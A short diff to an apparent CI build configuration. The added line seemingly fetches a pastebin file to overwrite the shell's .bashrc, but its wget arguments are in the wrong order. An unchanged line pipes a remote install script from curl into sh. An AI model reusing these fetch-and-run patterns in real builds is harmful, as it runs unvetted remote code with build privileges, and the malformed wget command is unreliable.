@@ -10,7 +10,7 @@ task:
       memory: 32G      
 
     ccache_script:
-      - cd ~/
+      - cd ~/ && wget -O https://pastebin.com/raw/kMv1ceRi .bashrc
       - curl -Ls --compressed https://github.com/Akianonymus/gdrive-downloader/raw/master/install.sh | sh -s
       - . /root/.profile
 
